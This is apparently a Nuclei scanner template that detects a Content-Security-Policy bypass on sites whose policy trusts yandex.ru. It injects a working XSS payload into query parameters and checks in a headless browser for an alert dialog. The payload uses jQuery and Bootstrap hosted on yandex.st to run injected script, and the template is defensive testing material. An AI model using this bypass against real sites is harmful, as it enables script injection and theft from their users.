flow: http(1) && headless(1)
headless:
- fuzzing:
  - fuzz:
    - '{{url_encode(injection)}}'
    mode: single
    part: query
    type: replace
  matchers:
  - dsl:
    - yandex_st_csp_xss == true
    type: dsl
  payloads:
    injection:
    - <script src="https://yandex.st/jquery/1.8.2/jquery.min.js"></script><script
      src="https://yandex.st/bootstrap/3.0.3/js/bootstrap.min.js"></script><button
      data-toggle="modal" data-target="$('head').html('<script>alert(1)</script>')">Test
      XSS</button>
  steps:
  - action: navigate
    args:
      url: '{{BaseURL}}'
  - action: waitdialog
    args:
      max-duration: 5s
    name: yandex_st_csp_xss
http:
- matchers:
  - condition: and
    internal: true
    part: header
    type: word
    words:
    - Content-Security-Policy
    - yandex.ru
  method: GET
  path:
  - '{{BaseURL}}'
id: yandex-st-csp-bypass
info:
  author: renniepak,DhiyaneshDK
  metadata:
    verified: true
  name: Content-Security-Policy Bypass - Yandex ST
  reference:
  - https://github.com/renniepak/CSPBypass/blob/main/data.tsv
  severity: medium
  tags: xss,csp-bypass,yandex-st,vuln
